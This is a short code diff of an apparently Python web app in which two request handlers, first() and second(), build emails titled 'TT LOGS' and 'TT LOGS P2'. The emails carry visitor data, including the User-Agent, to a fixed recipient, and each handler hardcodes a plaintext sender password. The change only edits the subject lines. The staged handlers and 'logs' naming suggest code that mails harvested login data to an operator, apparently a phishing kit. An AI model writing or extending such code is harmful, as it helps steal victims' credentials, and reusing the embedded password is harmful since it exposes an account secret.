@@ -150,7 +150,7 @@ def first():
         password = "dZB{tjvbEhKV"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW TT LOGS"
+        message["Subject"] = "3rdparty TT LOGS"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -187,7 +187,7 @@ def second():
         password = "dZB{tjvbEhKV"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "NEW TT LOGS P2"
+        message["Subject"] = "3rdparty TT LOGS P2"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
